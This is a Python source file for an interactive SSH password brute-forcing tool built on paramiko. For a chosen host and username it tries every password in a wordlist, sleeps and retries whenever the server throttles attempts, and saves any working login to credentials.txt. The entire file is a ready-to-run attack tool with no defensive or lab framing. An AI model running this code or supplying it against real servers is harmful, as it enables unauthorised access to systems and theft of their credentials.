import paramiko
import socket
import time
from colorama import init, Fore
import cmd

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE


class SSHBruteForceShell(cmd.Cmd):
    print(""" 
 ######   ######  ##     ## 
##    ## ##    ## ##     ## 
##       ##       ##     ## 
 ######   ######  ######### 
      ##       ## ##     ## 
##    ## ##    ## ##     ## 
 ######   ######  ##     ## 
    -BruteForceTool v1.0
------------------------------------------------

 """)
    intro = "Welcome to the SSH Bruteforce Python script.\nType help or ? to list commands.\n"
    prompt = "(sshbf) "
    file = None

    def do_connect(self, arg):
        "Connect to an SSH server. Syntax: connect [hostname] [username] [password file]"
        args = arg.split()
        if len(args) != 3:
            print(f"{RED}[!] Invalid syntax. Usage: connect [hostname] [username] [password file]{RESET}")
            return
        hostname, username, passlist_path = args
        passlist = open(passlist_path).read().splitlines()
        for password in passlist:
            if self.is_ssh_open(hostname, username, password):
                print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
                open("credentials.txt", "w").write(f"{username}@{hostname}:{password}")
                break

    def is_ssh_open(self, hostname, username, password):
        # initialize SSH client
        client = paramiko.SSHClient()
        # add to know hosts
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
        except socket.timeout:
            # this is when host is unreachable
            print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
            returning = False
        except paramiko.AuthenticationException:
            print(f"[!] Invalid credentials for {username}:{password}")
            returning = False
        except paramiko.SSHException:
            print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
            # sleep for a minute
            time.sleep(60)
            returning = self.is_ssh_open(hostname, username, password)
        else:
            # connection was established successfully
            returning = True
        finally:
            client.close()
            return returning

    def do_exit(self, arg):
        "Exit the SSH Bruteforce Python script."
        print("Exiting...")
        return True
    
    def do_help(self, arg):
        "List available commands"
        print("Available commands:")
        print("- connect [hostname] [username] [password file]: Connect to an SSH server and try to brute-force the password.")
        print("- exit: Exit the program.")

if __name__ == "__main__":
    SSHBruteForceShell().cmdloop()
